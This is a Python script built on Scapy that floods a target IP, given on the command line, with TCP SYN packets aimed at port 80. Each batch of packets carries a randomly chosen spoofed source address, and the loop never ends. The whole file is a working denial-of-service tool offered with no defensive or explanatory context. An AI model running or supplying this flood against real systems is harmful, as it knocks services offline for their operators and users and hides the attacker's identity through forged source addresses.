import random
from scapy.all import *
import sys
target_IP = sys.argv[1]
i = 1

while True:
   source_ip = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))

   for source_port in range(1, 65535):
      IP1 = IP(src = source_ip, dst = target_IP)
      TCP1 = TCP(dport = 80, flags="S")
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
      i+=1
      print("packet sent ", i)
